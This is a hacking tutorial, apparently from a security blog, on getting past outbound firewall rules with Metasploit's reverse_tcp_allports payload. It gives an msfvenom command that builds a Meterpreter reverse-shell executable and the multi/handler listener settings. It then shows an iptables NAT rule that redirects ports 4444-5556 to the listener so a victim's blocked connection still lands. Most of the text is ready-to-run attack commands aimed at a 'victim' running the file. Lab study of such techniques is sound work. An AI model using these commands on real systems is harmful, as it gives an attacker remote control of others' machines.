@@ -1,0 +1,37 @@
+
+Bypass Firewall Restrictions with Metasploit (reverse_tcp_allports)
+
+Network Address Translation generally involves “re-writing the source and/or destination addresses of IP packets as they pass through a router or firewall” (from http://en.wikipedia.org/wiki/Network_Address_Translation)
+The Linux kernel usually possesses a packet filter framework called netfilter (Project home: netfilter.org). This framework enables a Linux machine with an appropriate number of network cards (interfaces) to become a router capable of NAT. We will use the command utility ‘iptables’ to create complex rules for modification and filtering of packets. The important rules regarding NAT are – not very surprising – found in the ‘nat’-table. This table has three predefined chains: PREROUTING, OUTPUT und POSTROUTING.
+ALL-PORTS payload:-
+‘reverse_tcp’ only allows connection to one port, but if the victim has blocked outgoing connections except a few ports. Then it makes it difficult for the attacker to set a port for listening. ‘reverse_tcp _allports’ is used to to brute-force all the ports from {1-65535}.
+We use iptables to reroute any incoming connection to the listening port.
+Let’s begin
+We use metasploit to create a meterpreter reverse shell.
+msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=192.168.1.139 lport=4444 -f exe > reverse_shell.exe
+
+We now setup our listener using metasploit.
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp_allports
+msf exploit(multi/handler) > set lhost 192.168.1.139
+msf exploit(multi/handler) > set lport 4444
+msf exploit(multi/handler) > run
+
+Now we setup the firewall on our windows machine. We open firewall and select outbound connections.
+
+We select ports to define the ports we need to block.
+
+We select tcp to block tcp packets, and select port from 4444-5555.
+
+Now we select ‘Block the connection’ to block all the outgoing traffic packets from these ports.
+
+Now we select the types of connection the firewall applies to.
+
+We now name the firewall rule as “REVERSE_SHELL” and click finish to apply the rule.
+
+Now we define iptables to reroute all traffic coming to port 4444-5556 to port 4444. So that when the reverse shell tries to connect to our system on port 5556 it will be rerouted to port 4444.
+iptables -A PREROUTING -t nat -p tcp –dport  4444:5556 -j REDIRECT –to-port 4444
+
+As soon as the victim runs the file we get our reverse shell.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
